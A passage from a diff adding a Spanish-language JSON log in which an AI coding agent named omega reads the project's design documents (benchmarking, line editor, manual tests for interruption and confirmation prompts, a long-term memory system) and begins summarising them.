`src/tui/markdown/types.ts` con la interfaz `MarkdownRenderer`.\n2. Crear `src/tui/markdown/ansi-renderer.ts` con `AnsiRenderer`.\n3. Crear `src/tui/markdown/plain-renderer.ts` con `PlainTextRenderer` (wrapper que pasa texto sin cambios, útil para tests).\n4. Modificar `DisplayAssistantText` para aceptar el renderer en el constructor e implementar `#processLine` y `#renderInline`.\n5. Tests unitarios: parser de líneas, renderer ANSI, streaming con chunks cortados.\n6. Integrar en `index.ts`.\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_uMz7j2YwB47IdWCPvKJD7711",
+          "name": "read",
+          "input": {
+            "path": "docs/benchmarking-design.md"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_DeS3IVOHXjMg8dfoVbjQ2144",
+          "name": "read",
+          "input": {
+            "path": "docs/line-editor-design.md"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_dOhSU6fm5kJEu9exZiio6813",
+          "name": "read",
+          "input": {
+            "path": "docs/manual-tests-11-10.md"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_03_GyEnlJM9vIWt8JtuVi5a1848",
+          "name": "read",
+          "input": {
+            "path": "docs/memory-system-design.md"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_uMz7j2YwB47IdWCPvKJD7711",
+          "content": "# Benchmarking de modelos en omega — diseño\n\nCómo medir y comparar distintos modelos corriendo en omega: correctitud, costo,\neficiencia y velocidad, de forma reproducible.\n\n## El principio que ordena todo\n\nEl repo de tareas es la parte fácil. **Lo difícil —y lo que de verdad importa— es\nel verificador.** Un benchmark agéntico no es \"un repo con tareas\", es un set de:\n\n```\ntarea = (estado inicial del repo, prompt, chequeo objetivo de éxito)\n```\n\nSin un chequeo automatizado por tarea, terminás mirando a ojo cada corrida × cada\nmodelo y no escala. Es la idea de SWE-bench: la tarea es un repo en cierto estado +\nun problema + un test escondido; **éxito = el test pasa después de los cambios del\nagente.** El repo canónico tiene que estar hecho de tareas donde el éxito lo decide\nun script (corre tests, compara un diff, chequea un output), no tu criterio.\n\n## El eje cero es correctitud\n\nCosto, eficiencia y velocidad solo tienen sentido **condicionados a que la tarea\nsalió bien**. Un modelo barato y rápido que entrega mal no vale nada. El orden de\nevaluación es:\n\n1. ¿Resolvió la tarea? (pass/fail objetivo)\n2. Entre los que resolvieron: ¿cuánto costó / cuántos pasos / cuánto tardó?\n\nSi no medís correctitud primero, estás comparando lo barato que es equivocarse.\n\n## Las métricas, una por una\n\n- **Costo** (tokens × precio): la más limpia. omega ya la emite en su línea de\n  métricas. Directa y comparable.\n- **Eficiencia**: pasos/turnos del loop, tool calls, y tokens totales hasta\n  completar. Esto sí mide al modelo —qué tan económica es su trayectoria— y es\n  estable entre corridas.\n- **Velocidad**: cuidado. El wall-clock por OpenRouter mezcla la velocidad del\n  modelo con la latencia del provider, el routing y el overhead del harness. Es\n  ruidoso y no aísla \"el modelo\". **tokens/pasos es una proxy de eficiencia más\n  honesta que los segundos.** Si medís tiempo, sabé que es del proveedor tanto\n  como del modelo.\n\n## Metodología (lo que casi todos se olvidan)\n\n### Estocasticidad → correr N veces\n\nLas corridas agénticas son estocásticas: el mismo modelo en la misma tarea a veces\nla saca y a veces no. **Una sola corrida no dice nada.** Hay que correr cada tarea\n**k veces por modelo** (3–5 para empezar) y reportar:\n\n- **tasa de éxito** (cuántas de k pasaron), no un booleano.\n- **distribución** de costo/tiempo/pasos (mediana + dispersión), no un número\n  único.\n\nComparar modelos con n=1 lleva a conclusiones falsas.\n\n### Controlar los confounds\n\nMismo prompt, mismas tools, mismo system prompt, mismo `max_steps` / `max_tokens`\npara todos. **Lo único que varía es el `model`.** Si no, no estás midiendo el\nmodelo, estás midiendo tu setup.\n\n## Taxonomía de tareas (las \"varias use cases\")\n\nMapeadas a cómo se usa omega de verdad:\n\n- **Bug fix**: test que falla → hacerlo pasar. El más limpio de verificar.\n- **Feature nueva**: implementar a spec, verificada por tests.\n- **Refactor**: preservar comportamiento — tests siguen verdes (+ quizás un\n  chequeo estructural).\n- **Cambio multi-archivo**: toca varios archivos → mide navegación y blast radius.\n- **Read-heavy / \"encontrá dónde se maneja X\"**: verificable esperando un\n  archivo/función específica en la respuesta.\n\nEstos cinco cubren bien el espectro.\n\n## Construir vs robar\n\nNo armes SWE-bench. Dos caminos:\n\n- **Suite propia mínima**: un repo chico que escribís vos (un CLI, un parser, una\n  TODO app) con bugs y features plantados, cada uno con su script de chequeo.\n  Máximo control, entendés cada caso. Muy en el espíritu de omega.\n- **Robar uno hecho**: el **benchmark de Aider** (ejercicios de Exercism con\n  tests, multi-lenguaje) tiene exactamente la forma \"repo + tareas + verificador\"\n  y se puede apuntar a omega con poco pegamento. **SWE-bench-lite** si querés\n  tareas reales de GitHub, pero es pesado y Python-céntrico.\n\n## Lo que omega necesita para esto — dos cosas\n\n### 1. Modo headless\n\nHoy omega es interactivo (TUI). Para benchmarkear hay que correrlo no-interactivo:\n\n```\nprompt de entrada → corre hasta terminar → emite JSON\n{ success?, cost, tokens, steps, toolCalls, durationMs, model }\n```\n\nCasi todo eso ya se trackea en las métricas; falta exponerlo **en máquina** (JSON\na stdout o a un archivo), no en la línea linda del TUI. El `success` lo setea el\nharness al correr el chequeo, no omega.\n\n### 2. El harness de corrida\n\nPor cada `(tarea, modelo, repetición)`:\n\n1. **Resetear el repo al checkpoint** (git clean/reset) — *no negociable*; el\n   estado sucio de una corrida contamina la siguiente.\n2. Correr omega headless con ese modelo sobre el prompt de la tarea.\n3. Correr el script de chequeo de la tarea → pass/fail.\n4. Registrar la fila: tarea, modelo, repetición, éxito, costo, tokens, pasos,\n   tiempo.\n\nSalida: una tabla (CSV/planilla) que después agregás por (tarea, modelo) en tasa de\néxito + medianas.\n\n## Plan de arranque (chico)\n\n- 3–5 tareas, repo propio.\n- k = 3 corridas por (tarea, modelo).\n- 2–3 modelos.\n- Una planilla de resultados.\n\nCrecés la suite a medida que encontrás failure modes interesantes — que es, de\npaso, la mejor forma de descubrir qué mejorar en omega.\n\n## Decisiones abiertas\n\n- **¿Suite propia o Aider/Exercism?** Propia = más control y aprendizaje; Aider =\n  no construís el verificador desde cero.\n- **¿Qué optimizás?** Costo a igualdad de correctitud, o correctitud cruda. Esto\n  cambia qué tareas conviene priorizar.\n- **¿Dónde corre el headless?** Local vs contenedor (aislamiento real para el\n  `bash` del agente durante las corridas).\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_DeS3IVOHXjMg8dfoVbjQ2144",
+          "content": "# Diseño del LineEditor y render.ts\n\n## 1. Modelo de datos: buffer + cursor\n\nEl estado del editor son dos valores: un string (`#buffer`) y un índice (`#cursor`). No hay posición x/y guardada, se calcula cuando hace falta.\n\n```\n#buffer = \"hola\\nmundo\"\n#cursor = 7        // entre la 'u' y la 'n' de \"mundo\"\n```\n\nTodas las operaciones son aritmética de strings:\n\n- **Insertar**: `buffer.slice(0, cursor) + text + buffer.slice(cursor)`, después `cursor += text.length`.\n- **Backspace**: `buffer.slice(0, cursor-1) + buffer.slice(cursor)`, después `cursor--`.\n- **Delete**: `buffer.slice(0, cursor) + buffer.slice(cursor+1)` (cursor no cambia).\n- **Mover cursor**: solo `cursor++` o `cursor--`, validando bordes.\n\n## 2. Geometría de líneas\n\nComo el buffer puede tener `\\n`, hay helpers para traducir índice de carácter a fila/columna y viceversa:\n\n- `#lineStart()` busca el `\\n` anterior al cursor para saber dónde empieza la línea actual.\n- `#lineEnd()` busca el `\\n` siguiente al cursor.\n- `#cursorLine()` y `#cursorCol()` convierten el índice a (fila, columna).\n- `#moveToPrevLine()` y `#moveToNextLine()` arrancan en el `\\n` de la línea vecina y colocan el cursor en la columna correcta (truncada si la línea destino es más corta).\n\nEsto permite que Up/Down en multilínea preserve la columna siempre que se pueda.\n\n## 3. Historial con draft\n\nEl historial es un array `#history` de strings. La navegación funciona así:\n\n- `#historyIndex = -1` significa \"no estoy navegando, estoy en el buffer real\".\n- Cuando se aprieta Up por primera vez, se guarda el buffer actual en `#draftBuffer` y `#draftCursor`, se pone `#historyIndex` en el último comando, y se reemplaza el buffer.\n- Up sucesivo decrece `#historyIndex` (comandos más viejos).\n- Down sube `#historyIndex`. Cuando llega al final, restaura el draft (lo que estabas escribiendo antes de navegar).\n\n`addToHistory()` evita duplicados consecutivos.\n\n## 4. Multilínea + historial sin conflicto\n\nLa regla: Up/Down primero mueven entre líneas. Solo si el cursor está en la primera línea (Up) o última línea (Down) del buffer, pasan a navegar el historial. Esto se chequea en `#handleUp()` y `#handleDown()` comparando `#cursorLine()` con `#lineCount()`.\n\n## 5. Atajos de teclado\n\n| Atajo   | Acción                                |\n|---------|---------------------------------------|\n| Ctrl+A  | Ir al inicio de línea (Home)          |\n| Ctrl+E  | Ir al final de línea (End)            |\n| Ctrl+U  | Borrar desde inicio de línea hasta cursor |\n| Ctrl+K  | Borrar desde cursor hasta fin de línea    |\n| Ctrl+W  | Borrar palabra hacia atrás                |\n\nImplementados en `#handleCtrl()` usando `#deleteRange(from, to)`.\n\n## 6. Render con cursor ANSI real\n\n`render()` devuelve `\"> \" + buffer`.\n\n`getCursorPosition()` devuelve `{ row, col }` donde `row` es la línea del cursor (0-based) y `col` es la columna visual, sumando los 2 caracteres del prompt `\"> \"` solo si es la primera línea.\n\n`render.ts` usa esto para posicionar el cursor del terminal con secuencias ANSI:\n\n```\n\\x1b[0J     borrar de acá hacia abajo\n\\x1b[{n}A   subir n líneas\n\\x1b[{n}C   avanzar n columnas\n```\n\nEl ciclo de dibujo:\n\n1. Dibujar el render completo al stdout.\n2. El cursor del terminal queda al final del render. Se calcula cuántas líneas subir y cuántas columnas avanzar para llegar a la posición indicada por `getCursorPosition()`.\n3. Se emiten los códigos ANSI que mueven el cursor a esa posición.\n\n## 7. El bug del output pisado — save/restore cursor\n\n**Problema**: `\\x1b[{n}A` es un movimiento relativo. Entre cada iteración del loop principal de `index.ts`, el cursor queda al final del output del asistente. La segunda iteración hacía `\\x1b[2A` desde ahí creyendo que llegaba al editor, pero el editor estaba muchas líneas más arriba. El `\\x1b[0J` borraba líneas del historial de output.\n\n**Solución**: `\\x1b7` (DECSC) guarda la posición absoluta del cursor justo antes del primer `draw()`. Cada `draw()` posterior empieza con `\\x1b8` (DECRC) que restaura esa posición exacta, sin importar qué pasó entre medio. Es un ancla fija.\n\nAl hacer commit, el cursor se baja al final del contenido del editor con `\\x1b[{n}B` y se emite `\\r\\n` para que el siguiente output del loop principal quede debajo, no encimado.\n\n## 8. `reset()` e instancia única\n\n`LineEditor` se instancia una sola vez en `index.ts` (antes del `while`). `run()` lo usa, y al terminar se llama `reset()` que limpia buffer y done pero conserva el historial. Sin esto, el segundo `run()` veía `#done = true` y terminaba al instante sin esperar input.\n\n## 9. `InputComponent` y el contrato\n\nLa interfaz `InputComponent<T>` en `component.ts` define el contrato entre el componente y `render.ts`:\n\n```ts\ninterface InputComponent<T> {\n  render(): string;\n  handleKey(key: Key): void;\n  isDone(): boolean;\n  getResult(): T;\n  getCursorPosition?(): CursorPosition;\n}\n```\n\n`getCursorPosition()` es opcional — si no está, `render.ts` no intenta posicionar el cursor y simplemente lo deja al final del output.\n\n## 10. `decodeKey.ts`\n\nConvierte bytes crudos del stdin en eventos tipados (`Key`). Soporta:\n\n- Caracteres imprimibles, enter, backspace, tab, escape\n- Flechas (up/down/left/right), home, end, delete\n- Ctrl+letra (bytes 0x01-0x1a)\n- Pegado con bracketed paste (`\\x1b[200~`)\n- Shift+Enter (`\\x1b[27;2;13~`)\n\nEsto abstrae completamente las secuencias de escape del resto del sistema.\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_dOhSU6fm5kJEu9exZiio6813",
+          "content": "# Pruebas manuales — SIGINT (#11) y ask_user (#10)\n\n## Preparación\n\n```bash\nnpm run build\nnpm run dev\n```\n\nTodas las pruebas asumen que estás en el prompt `>` de omega.\n\n---\n\n## #11 — SIGINT para interrumpir al agente\n\n### Prueba 1: Interrumpir durante una llamada larga al LLM\n\n1. Escribí un prompt que haga que el agente genere mucho texto:\n\n```\nEscribí un poema épico de 500 líneas sobre la historia de la computación.\n```\n\n2. Apenas empiece a salir texto (o durante el streaming), apretá **Ctrl+C**.\n3. **Esperado**: Sale `⏹ Interrumpido por el usuario.` y volvés al prompt `>`. La sesión sigue viva, el historial se preserva.\n4. **Verificá**: Escribí `hola` y confirmá que el agente responde normalmente.\n\n### Prueba 2: Interrumpir durante ejecución de tools\n\n1. Pedí algo que dispare varias tools:\n\n```\nLeé todos los archivos .ts del proyecto y hacé un resumen\n```\n\n2. Mientras se están ejecutando las tools (ves `> read ...` o `> bash ...`), apretá **Ctrl+C**.\n3. **Esperado**: Se interrumpe limpiamente, volvés al prompt. La sesión no se pierde.\n4. **Verificá**: Volvé a escribir cualquier cosa y confirmá que el agente responde.\n\n### Prueba 3: Ctrl+C en el prompt (sin agente corriendo)\n\n1. Con el agente en reposo (prompt `>`), apretá **Ctrl+C**.\n2. **Esperado**: Sale del programa (comportamiento de siempre). Esto no debe cambiar.\n\n### Prueba 4: Interrumpir y seguir conversación\n\n1. Escribí:\n\n```\nHacé un ls y después leé AGENT.md\n```\n\n2. Apretá **Ctrl+C** mientras procesa.\n3. **Esperado**: Interrupción limpia, prompt disponible.\n4. Escribí:\n\n```\nCuáles son las tools disponibles?\n```\n\n5. **Esperado**: El agente responde normalmente, usando el contexto de la conversación (no perdió la memoria de la sesión).\n\n---\n\n## #10 — ask_user (modo plan / confirmación)\n\n### Prueba 5: Confirmación antes de acción destructiva\n\n1. Escribí:\n\n```\nBorrá el archivo src/tools/ask-user.ts\n```\n\n2. **Esperado**: El agente invoca `ask_user` pidiendo confirmación. Ves algo como:\n\n```\n> ask_user ...\n  = (confirmación recibida)\n\n⚠ ¿Querés que borre el archivo src/tools/ask-user.ts?\n\n> Responder (Enter para enviar, vacío para cancelar): _\n```\n\n3. Escribí `no` y apretá Enter.\n4. **Esperado**: El agente recibe \"no\" como respuesta y **no borra** el archivo. Debería decir algo como \"Ok, no borro nada\".\n5. **Verificá**: `ls src/tools/ask-user.ts` sigue existiendo.\n\n### Prueba 6: Confirmación afirmativa\n\n1. Creá un archivo temporal:\n\n```bash\necho \"test\" > /tmp/omega-test-file.txt\n```\n\n2. En omega:\n\n```\nBorrá el archivo /tmp/omega-test-file.txt\n```\n\n3. Cuando pregunte, respondé `sí` o `dale`.\n4. **Esperado**: El agente borra el archivo.\n5. **Verificá**: `ls /tmp/omega-test-file.txt` ya no existe.\n\n### Prueba 7: Respuesta vacía (cancelar)\n\n1. Escribí:\n\n```\nInstalá el paquete cowsay con npm\n```\n\n2. Cuando aparezca la confirmación, apretá **Enter** sin escribir nada.\n3. **Esperado**: El agente interpreta la respuesta vacía como cancelación y no instala nada.\n4. **Verificá**: `npx cowsay --version` no debería mostrar nada (o error).\n\n### Prueba 8: Pedido de elegir entre opciones\n\n1. Escribí:\n\n```\nTengo tres opciones de nombre para una variable: userList, allUsers, accountCollection. Cuál me recomendás?\n```\n\n2. **Esperado**: El agente debería responder sin usar `ask_user` (no es una acción destructiva). Si usa `ask_user`, respondé con tu elección y verificá que procesa la respuesta.\n\n### Prueba 9: El agente NO pide confirmación para tareas rutinarias\n\n1. Escribí:\n\n```\nLeé el archivo package.json\n```\n\n2. **Esperado**: El agente lee el archivo directamente, **sin** pedir confirmación.\n3. **Verificá**: Ves el contenido del archivo sin ninguna interrupción.\n\n### Prueba 10: ask_user + SIGINT combinados\n\n1. Escribí:\n\n```\nInstalá three.js con npm\n```\n\n2. Cuando aparezca el prompt de confirmación (`> Responder ...`), apretá **Ctrl+C**.\n3. **Esperado**: Interrumpe la pausa y vuelve al prompt principal. Es como si hubieras cancelado la confirmación.\n4. **Verificá**: `ls node_modules/three` no existe (o `npm ls three` no lo muestra).\n\n---\n\n## Cosas a verificar en general\n\n- Después de cada interrupción con SIGINT, la línea de métricas (`~ ctx: ...`) debería aparecer.\n- El spinner de \"Pensando\" no debería quedar colgado después de SIGINT ni después de ask_user.\n- El costo acumulado de la sesión se sigue mostrando correctamente.\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_03_GyEnlJM9vIWt8JtuVi5a1848",
+          "content": "# Omega — Diseño del sistema de memoria (cabinet)\n\n**Estado:** Diseño / visión. No implementado.\n**Fecha:** 2026-06-12\n**Contexto:** Surgió de una sesión de diseño larga. Es la *visión* del sistema de\nmemoria de largo plazo de omega. No hay que construir todo esto de una — ver\n\"Fases\" al final. La arquitectura se gana con el uso, no se inventa de antemano.\n\n---\n\n## 1. Problema\n\nDos dolores que resultan ser el mismo:\n\n- **Gestión de contexto.** El modelo es stateless: cada llamada reenvía todo el\n  historial. El contexto crece y se llena de cosas rancias (outputs de tools\n  viejos, archivos leídos hace 10 turnos). Más contexto ≠ mejor: cuesta tokens,\n  agrega latencia, y degrada la atención (\"lost in the middle\").\n- **Memoria entre sesiones.** Hoy omega no recuerda nada de una sesión a otra.\n\nLa solución a los dos es la misma pieza: una memoria de largo plazo en disco.\n\n## 2. Modelo mental\n\nDos memorias, y el trabajo del agente es **mover cosas entre ellas**:\n\n- **Memoria de trabajo** = la ventana de contexto (efímera, por sesión).\n- **Memoria de largo plazo** = el cabinet (persistente, en disco, entre sesiones).\n\nEl agente hace dos movimientos:\n- **Recall:** traer del cabinet al contexto solo lo relevante.\n- **Consolidación:** empujar hallazgos durables del contexto al cabinet.\n\nMetáfora guía: el contexto es una **mesa de trabajo**, se mantiene ordenada con\nsolo lo que se necesita ahora; el cabinet es el **cajón**; el `INDEX` es cómo\nencontrás la herramienta en el cajón.\n\n## 3. Formato: Markdown como fuente de verdad\n\nEl cabinet tiene dos lectores con necesidades opuestas:\n\n- **El humano** (browsea en Obsidian): HTML es más expresivo.\n- **El agente** (recall): HTML es **caro y ruidoso** — 2-4x los tokens del mismo\n  contenido en MD, con tags que el modelo tiene que ver-a-través. Pelea contra\n  toda la disciplina de contexto.\n\n**Decisión:** Markdown es la fuente de verdad (liviano para el agente, diffs\nlindos, version-control). Se **renderiza a HTML on-demand** para el ojo humano\n(el `server.ts` con `marked` ya hace esto). Fuente vs presentación: el agente\nlee MD lean, el humano ve HTML expresivo. Nadie cede nada.\n\n## 4. Topología de scope (en cascada, como git config)\n\nEl conocimiento tiene dos escalas genuinas:\n- **Atado al proyecto:** arquitectura de *este* repo, decisiones de *este* ticket.\n- **Transversal / personal:** preferencias, patrones que cruzan proyectos.\n\nPor eso, dos tiers no es over-engineering — espeja la realidad. Modelo git:\n`~/.gitconfig` global + `.git/config` por repo.\n\n- **Proyecto:** caminar hacia arriba desde el cwd buscando `.omega/cabinet/`\n  (como git busca `.git`).\n- **Global:** ubicación fija, `~/.omega/cabinet/`.\n- **Recall:** leer ambos índices; lo de proyecto pesa más por específico.\n- **Escritura:** rutear por scope — específico del repo → proyecto; general → global.\n\nLa idea de \"global que apunta a cabinets por proyecto\" NO es un modelo aparte:\nes **búsqueda cross-proyecto** montada encima de la cascada (un registro en el\nglobal que indexa los cabinets de proyecto). Se difiere hasta tener varios\ncabinets y sentir el dolor.\n\n## 5. Estructura: lean, emerge del uso\n\nEl cabinet actual (de Claude Code) no se diseñó, *emergió* de iterar. El de omega\nva a emerger igual, y puede ser distinto porque omega se comporta distinto.\n**No pre-diseñar la taxonomía perfecta.** Arrancar con `INDEX` + dos o tres\ncarpetas obvias y dejar que las categorías aparezcan.\n\nDos capas, esto sí es invariante:\n\n- **INDEX** = catálogo **fino**, siempre cargado (eager, barato). Solo punteros:\n  título + una línea + link + status. **No contenido.** Si engorda (el cabinet\n  actual tiene un INDEX de 37KB), deja de ser un catálogo barato.\n- **Docs** = el contenido, traídos selectivamente (lazy, caro).\n\n## 6. Workflow\n\n### Compuerta — qué se consolida\nRegla: **alto costo de re-derivar × vida media larga = consolidá.** Bajo en\ncualquiera de los dos = que muera en la sesión.\n- Sí: decisiones y su *por qué*, hallazgos de investigaciones, gotchas no obvios,\n  modelos mentales de cómo funciona un sistema.\n- No: cosas que grep recupera al toque, estado efímero, nada que el código/tests\n  ya encoden.\n- **Anti-patrón clave:** nunca snapshotear algo con fuente de verdad viva (el\n  código es la verdad de \"qué hace el código\"). El cabinet es para lo que el\n  código NO captura: el por qué, la historia, el entendimiento transversal.\n\n### Recall — INDEX eager, docs lazy\nProgressive disclosure: cargás el catálogo (INDEX) siempre, traés el ítem (doc)\ncuando la entrada se ve relevante.\n\n### Frescura del índice — la disciplina de mayor leverage\nComo el INDEX es lo único que se lee siempre, mantenerlo verdadero hace toda la\nmemoria descubrible. **Consolidar no está terminado hasta que el índice está\nactualizado** — escribir el doc y registrarlo en el índice son una operación\natómica. Un doc sin entrada en el índice está, de hecho, olvidado. Validar\nperiódicamente: links rotos (ya lo hace `validate-index.sh`) + docs huérfanos.\n\n## 7. Autonomía: escribir solo, pero saber olvidar\n\nAsimetría con las acciones peligrosas: escribir al cabinet **no es destructivo**\n(es append, reversible vía git). Pedir confirmación por cada nota sería molesto\npara algo inofensivo. Así que la escritura puede ser autónoma.\n\nEl riesgo real no es daño, es **polución / rot**: el modelo sobre-guarda y el\ncabinet se llena de docs marginales.\n\n**Insight central:** el peligro no es la escritura autónoma, es la escritura\nautónoma **sin olvido autónomo.** Una memoria que solo crece se pudre, por más\nestricta que sea la compuerta (las compuertas gotean, la relevancia decae).\nLa memoria humana funciona porque olvidamos. → El fix no es una compuerta más\napretada, es **podar**. Remember *and* forget.\n\n## 8. Sueño: dos fases (vigilia / sueño)\n\nomega tiene dos fases, como la memoria biológica:\n- **Vigilia:** hace tareas, acumula memoria cruda y rápida (compuerta estricta).\n- **Sueño:** sesión de housekeeping que consolida, poda e integra.\n\n### Qué hace un sueño (mapea al sueño biológico)\n- **Consolida:** replay de lo reciente (logs, docs nuevos) → integrar a la\n  estructura de largo plazo.\n- **Poda:** archivar lo rancio / marginal / duplicado.\n- **Integra:** mergear duplicados, linkear relacionados, refrescar el INDEX.\n\n### El regalo arquitectónico\nUna sesión de sueño es **simplemente otro `AgentConfig` corrido por el mismo\n`Runner`.** Un omega-que-codea y un omega-que-sueña son la misma máquina con\ndistinta personalidad (system prompt de housekeeping, toolset acotado al cabinet,\nquizás modelo más barato porque podar es mecánico). La separación\n`AgentConfig` ↔ `Runner` da el \"soñar\" casi gratis: es un prompt + un trigger,\nno un subsistema nuevo.\n\n### Triggers (\"cada cierto tiempo o bajo ciertas condiciones\")\n- **Tiempo:** sueño nocturno = un cron/launchd que corre omega en modo-dream.\n  (Lo más simple para arrancar.)\n- **Presión:** cuando el cabinet cruza un umbral de desorden (N docs, INDEX > X KB,\n  duplicación). Mapea a la \"presión de sueño\": se acumula, gatilla, se resetea.\n  (Lo más elegante.)\n- **Manual:** un `/sleep`.\n\n### Cautelas\n- **Archivar, no borrar.** El olvido es mover a `archive/`, no `rm` — reversible,\n  con git de red. Un pruning mal hecho no destruye nada irrecuperable.\n- **Dejar un dream-log.** El sueño muta tu segundo cerebro autónomamente; tiene\n  que dejar un changelog de qué consolidó/podó/mergeó, para revisar async (como\n  recordar un sueño). Observabilidad.\n- **Cuesta tokens.** Leer todo el cabinet es pesado → no muy frecuente, modelo\n  barato para lo mecánico, el trigger por presión lo rate-limitea solo.\n\n## 9. Notas de arquitectura\n\nCasi todo esto es **prompt + convención**, no código. omega ya tiene\n`read`/`write`/`edit`/`bash` para operar sobre archivos. Lo único que es código\nreal:\n- Un **resolver de cabinet** (~20 líneas): dado el cwd, devuelve el path del\n  cabinet de proyecto (walk-up) y el global.\n- Quizás un `validate` mejorado (links rotos + docs huérfanos).\n- Reusa `Runner` y `AgentConfig` para el modo sueño.\n\nEl cabinet debería ser **auto-describible**: un README/AGENTS.md adentro que\ndocumente las convenciones, que omega (y Claude Code) leen on-demand. Patrón\n\"CLI tool + README\" de Pi aplicado a la memoria.\n\nCapacidad linda que se abre: si dos agentes (omega y Claude Code) apuntan al\nmismo cabinet, **comparten memoria de largo plazo.** Dos agentes, un cerebro.\n\n## 10. Fases (no construir todo de una)\n\n1. **Cabinet de proyecto** con estructura mínima + INDEX. omega lee/escribe vía\n   las tools que ya tiene. Convención + prompt.\n2. **Compuerta + recall** en el system prompt (qué guardar, INDEX eager/docs lazy,\n   atomicidad doc+índice).\n3. **Tier global** (`~/.omega/cabinet/` + resolución en cascada) cuando aparezca\n   la necesidad de memoria transversal.\n4. **Sueño** (modo housekeeping = AgentConfig nuevo), primero trigger manual/tiempo,\n   después por presión.\n5. **Registro cross-proyecto** (búsqueda entre cabinets). Diferir más que nada.\n\n## 11. Decisiones abiertas\n\n- Estructura/taxonomía concreta del cabinet v1 (dejar emerger).\n- Workflow de recall: ¿el INDEX se inyecta al system prompt, o omega lo lee con\n  una tool al arrancar?\n- Trigger exacto del sueño y umbrales de presión.\n- ¿El dream-log vive en el cabinet o aparte?\n\n---\n\n## 12. Workspaces y multi-agente (visión más amplia)\n\n> Excede la memoria, pero engancha: el Workspace es el contenedor natural del\n> cabinet y de las sesiones. Visión, no implementación. Difiere hasta sentir la\n> necesidad.\n\n### Observación que lo dispara\nClaude Code (y omega hoy) son **una conversación lineal = un contexto.** Cambiar\nde modelo no te da un agente nuevo: le pasás el mismo historial al modelo nuevo,\nque lo re-lee entero. No hay forma de tener N agentes con contextos *separados*\nque se comuniquen.\n\n### La idea: modelo de actores aplicado a agentes\nActores independientes, cada uno con estado privado (su contexto), que se\ncomunican por **mensajes compactos**, no compartiendo historiales.\n\nY el punto clave: **es una estrategia de contexto.** En vez de un contexto\ngigante y contaminado, tenés varios agentes especializados, cada uno con un\ncontexto chico y limpio, que se pasan **conclusiones, no sus historiales.** Es el\nargumento de los sub-agents de Mario: el hijo trabaja en su contexto y devuelve\nsolo el resultado, manteniendo limpio al padre. Multi-agente-con-contextos-\naislados *es* gestión de contexto por otra vía.\n\n### Layering\n- **Workspace** = el contenedor. Posee el proyecto/cwd, el cabinet, el registro\n  de sesiones, y el canal de comunicación.\n- **Session** = un agente = un contexto. Posee su historial y su `AgentConfig`\n  (modelo, prompt, tools).\n- **Comunicación** = las sesiones se pasan mensajes compactos, o comparten\n  archivos (el cabinet como blackboard).\n\n### omega ya está ~90%\nUna Session es un `Runner` + `AgentConfig` + historial — los tres ya existen.\nDistintos `AgentConfig` = distintos modelos/prompts por agente (el \"cambiar de\nmodelo\" pero como agentes *separados*, no un contexto que muta). Falta:\n- El **Workspace** como contenedor arriba de las sesiones.\n- El **mecanismo de comunicación**. Versión Pi: por archivos (cabinet de\n  blackboard), cero IPC. Versión rica: message-passing / mailboxes (actores).\n\n### Conexión con la memoria\nEl Workspace es el dueño natural del cabinet. Los agentes de un workspace\ncomparten el cabinet como blackboard y como memoria de largo plazo. El \"sueño\"\nes una sesión más dentro del workspace.\n\n### Decisiones abiertas\n- ¿Comunicación por archivos (blackboard) o message-passing real?\n- ¿Quién orquesta — un agente padre, o el Workspace como scheduler?\n- ¿Cómo se persiste/reanuda un Workspace entero (varias sesiones a la vez)?\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Bueno, acá va el panorama completo:\n\n---\n\n## Documentos en `docs/`\n\n### 1. `improvements.md` — El backlog canónico (27 items)\nLista de mejoras priorizadas en alta/media/baja. Muchas ya resueltas (marcadas con checkmark). Las que quedan pendientes son las que más se solapan con las issues de GitHub:\n\n- **Alta**: tipar `any` en runner/providers, tests del Runner, tests de OpenRouterProvider.\n- **Media**: selección de provider por config, historial/cursores en el LineEditor, `DisplayToolCall` sin usar.\n- **Baja**: streaming, seguridad de BashTool, tests de TUI/commands/context-management/Session/edit, bug de AnthropicProvider, runner y `stop_reason`, validación de API key, truncate afecta al modelo, README desactualizado, logs sin rotación.\n\n### 2. `harness-improvements.md` — Calidad por harness, no por modelo\nDocumento estratégico. Propone 5 mejoranzas al andamiaje para sacarle más jugo al mismo modelo, basadas en evidencia de una sesión real que consumió ~3M tokens. Orden sugerido:\n\n1. **Compaction/poda en el loop + descartar archivos ya usados** (mayor impacto)\n2. **Tool apply-patch / multi-edit + mejor feedback de error** (matar el thrashing de edits)\n3. **Plan -> aprobar -> ejecutar** (la tool ask_user ya existe, falta cablear)\n4. **Verificación en system prompt** (distinguir \"compila\" de \"funciona\")\n5. **Scope chico + checkpoints** (una tarea por sesión, `/clear` entre features)\n\nTambién propone métricas para medir si las mejoras funcionan (edits por archivo, re-lecturas, tokens totales, errores de tool).\n\n### 3. `markdown-rendering-design.md` — Renderizado de Markdown en la TUI\nDiseño para parsear el output markdown del LLM y traducirlo a secuencias ANSI (negritas, código, headings, blockquotes, etc.). Usa patrón Strategy: `MarkdownRenderer` como interfaz, `AnsiRenderer` para hoy, `PlainTextRenderer` para tests, `HtmlRenderer` para futuro. Parser por líneas (estrategia 1), sin dependencias externas. 6 pasos de implementación, archivos nuevos en `src/tui/markdown/`.\n\n### 4. `line-editor-design.md` — Diseño del editor de línea\nDocumenta la arquitectura actual del `LineEditor`: buffer + cursor como estado, geometría de líneas (índice -> fila/col), historial con draft, multilínea sin conflicto con historial, atajos emacs-like, render con cursor ANSI real, save/restore cursor (`\\x1b7`/`\\x1b8`), `reset()` para reusar la instancia, el contrato `InputComponent`, y `decodeKey.ts`.\n\n### 5. `memory-system-design.md` — Sistema de memoria/cabinet (largo plazo)\nVisión más ambiciosa. Propone un \"cabinet\" en disco (markdown) con INDEX fino (eager) + docs (lazy). Dos tiers: proyecto y global (como git config). 